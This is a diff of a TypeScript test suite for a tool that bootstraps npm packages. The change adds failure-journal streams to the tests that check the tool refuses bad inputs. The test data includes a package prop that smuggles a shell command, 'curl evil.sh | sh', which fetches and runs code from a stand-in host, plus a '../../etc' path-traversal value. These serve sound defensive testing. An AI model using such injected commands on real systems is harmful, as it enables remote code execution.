@@ -14,7 +14,8 @@
  * Nothing here contacts a registry.
  */
 
-import { describe, it } from "@executablemd/test-support/bdd";
+import { beforeEach, describe, it } from "@executablemd/test-support/bdd";
+import { journalBeforeEach, useJournalStream } from "@executablemd/test-support/failure-journal";
 import { expect } from "@executablemd/test-support/expect";
 import { ensure, resource, scoped, until } from "effection";
 import type { Operation } from "effection";
@@ -31,6 +32,7 @@ import { Elicitation, execute, useTempFileCompiler } from "@executablemd/core";
 import type { ElicitationRequest } from "@executablemd/core";
 
 const DOCUMENT = fileURLToPath(new URL("../../components/BootstrapNpmPackage.md", import.meta.url));
+const OWNER = "scripts/tests/bootstrap-npm-package.test.ts";
 
 const BOOTSTRAP_VERSION = "0.0.0-bootstrap.0";
 
@@ -306,7 +308,11 @@ interface Run {
   execCount: number;
 }
 
-function run(fixture: Fixture, options: RunOptions = {}): Operation<Run> {
+function run(
+  fixture: Fixture,
+  options: RunOptions = {},
+  stream = new InMemoryStream(),
+): Operation<Run> {
   return scoped(function* () {
     if (options.state) {
       yield* writeTextFile(fixture.stateFile, options.state);
@@ -393,7 +399,7 @@ function run(fixture: Fixture, options: RunOptions = {}): Operation<Run> {
     try {
       const execution = yield* execute({
         path: DOCUMENT,
-        stream: new InMemoryStream(),
+        stream,
         props: { package: options.packageProp ?? "packages/fixture" },
       });
       // The two steps cli.ts performs, in its order: drain the output stream
@@ -447,6 +453,7 @@ function expectNoRegistryMutation(run: Run): void {
 }
 
 describe("bootstrap an npm package", () => {
+  beforeEach(journalBeforeEach(OWNER));
   describe("verifying before it works", () => {
     it("renders the checklist from what npm reported", function* () {
       const fixture = yield* useFixture();
@@ -462,7 +469,7 @@ describe("bootstrap an npm package", () => {
 
     it("stops on a failed login, before it looks at the registry", function* () {
       const fixture = yield* useFixture();
-      const result = yield* run(fixture, { whoamiFails: true });
+      const result = yield* run(fixture, { whoamiFails: true }, yield* useJournalStream(DOCUMENT));
 
       expect(result.ok).toBe(false);
       expect(result.requests.length).toBe(0);
@@ -473,7 +480,11 @@ describe("bootstrap an npm package", () => {
 
     it("stops on an npm too old for `npm trust`", function* () {
       const fixture = yield* useFixture();
-      const result = yield* run(fixture, { npmVersion: "11.14.0" });
+      const result = yield* run(
+        fixture,
+        { npmVersion: "11.14.0" },
+        yield* useJournalStream(DOCUMENT),
+      );
 
       expect(result.ok).toBe(false);
       expect(result.failure).toContain("11.15");
@@ -592,7 +603,11 @@ describe("bootstrap an npm package", () => {
   describe("refusing before anyone is asked", () => {
     it("refuses a package already published at another version", function* () {
       const fixture = yield* useFixture();
-      const result = yield* run(fixture, { state: "unexpected" });
+      const result = yield* run(
+        fixture,
+        { state: "unexpected" },
+        yield* useJournalStream(DOCUMENT),
+      );
 
       expect(result.ok).toBe(false);
       expect(result.output).toContain("is already a live package on npm");
@@ -603,7 +618,11 @@ describe("bootstrap an npm package", () => {
 
     it("refuses a reservation whose dist-tags are not the expected one", function* () {
       const fixture = yield* useFixture();
-      const result = yield* run(fixture, { state: "foreign-tag" });
+      const result = yield* run(
+        fixture,
+        { state: "foreign-tag" },
+        yield* useJournalStream(DOCUMENT),
+      );
 
       expect(result.ok).toBe(false);
       expect(result.requests.length).toBe(0);
@@ -613,7 +632,11 @@ describe("bootstrap an npm package", () => {
 
     it("refuses a workspace path with no manifests", function* () {
       const fixture = yield* useFixture();
-      const result = yield* run(fixture, { packageProp: "packages/absent" });
+      const result = yield* run(
+        fixture,
+        { packageProp: "packages/absent" },
+        yield* useJournalStream(DOCUMENT),
+      );
 
       expect(result.ok).toBe(false);
       expect(result.requests.length).toBe(0);
@@ -623,7 +646,11 @@ describe("bootstrap an npm package", () => {
 
     it("refuses a member outside the @executablemd scope", function* () {
       const fixture = yield* useFixture();
-      const result = yield* run(fixture, { packageProp: "packages/foreign" });
+      const result = yield* run(
+        fixture,
+        { packageProp: "packages/foreign" },
+        yield* useJournalStream(DOCUMENT),
+      );
 
       expect(result.ok).toBe(false);
       expect(result.requests.length).toBe(0);
@@ -633,9 +660,13 @@ describe("bootstrap an npm package", () => {
 
     it("refuses a package prop that would reach the shell", function* () {
       const fixture = yield* useFixture();
-      const result = yield* run(fixture, {
-        packageProp: "packages/fixture; curl evil.sh | sh",
-      });
+      const result = yield* run(
+        fixture,
+        {
+          packageProp: "packages/fixture; curl evil.sh | sh",
+        },
+        yield* useJournalStream(DOCUMENT),
+      );
 
       expect(result.ok).toBe(false);
       // Refused by schema validation before the body ran at all — not cleaned
@@ -646,7 +677,11 @@ describe("bootstrap an npm package", () => {
 
     it("refuses a package prop that escapes the workspace", function* () {
       const fixture = yield* useFixture();
-      const result = yield* run(fixture, { packageProp: "../../etc" });
+      const result = yield* run(
+        fixture,
+        { packageProp: "../../etc" },
+        yield* useJournalStream(DOCUMENT),
+      );
 
       expect(result.ok).toBe(false);
       expect(result.execCount).toBe(0);
@@ -655,7 +690,7 @@ describe("bootstrap an npm package", () => {
 
     it("refuses a preview that prints before it fails, keeping what it printed", function* () {
       const fixture = yield* useFixture();
-      const result = yield* run(fixture, { packFails: true });
+      const result = yield* run(fixture, { packFails: true }, yield* useJournalStream(DOCUMENT));
 
       expect(result.ok).toBe(false);
       // npm's own diagnostic reaches the failure, and everything rendered
